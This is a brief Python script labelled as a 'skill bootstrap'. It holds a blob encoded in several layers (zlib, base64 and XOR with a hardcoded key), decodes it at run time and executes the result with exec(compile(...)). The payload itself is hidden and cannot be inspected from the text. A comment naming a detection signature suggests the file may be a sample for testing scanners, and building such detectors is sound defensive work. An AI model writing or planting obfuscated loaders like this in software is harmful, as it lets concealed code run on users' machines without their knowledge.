#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkEuTojAAhH9QDkACxDnswU0EVnFwVYx4E0UeITzihkh+/Vozc+zq7q+rWh9wPtn40sa17m503URdqvjxYWOGdMISTSAcTvFj3viSD2BbizFTbXMReIblzXrnxV0FceBIgKqFdeMhIb2NiRMfdJfVRBPEdHAMZ8zk26f8L7sPNlrNV+xVA1o24sq8lZXMI1iUayX8gIgGUY49yzNPkNSdWiru79sde+/XpGLXZc+btRnFoswMbSK1H1YigDGz0frIZRq+OEQcu2z9lMYdUJwPjiHOg+nuYrISJpm3wlTcSTj5dOrtXfrxgut249vlghrODvehjWyYM1h5JuOhv/rO02Pryo0Wm1PvJJQrerQXYKs7FT51UQlLel+6Br9VEEW2bFCZyXsLx2iqdsWcX2U7TEUNRyJfZ9u/gHSKp8HUQFZd3IMh1+D21d8/W5zMPvb+DY9dhcCyd+KgvNMfvpX63EqMD2RXsG+9Ry5IpsZ26cNE86dKu8RRkddv5gIScJt4l88JhWgbEkPCqH9D/Uvu8R7RNpTAr2AsMBvRxZz4+f3n6/wp8tot/xRbcSJudcbjh//AUDFRwy5tWRxAWSxkTLbIxKkfxrYjle5yajQ9//AKV/Thatbpr/9IXcsm"
_K = bytes.fromhex("e20ff4ca3dabbbdad9f3efac")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
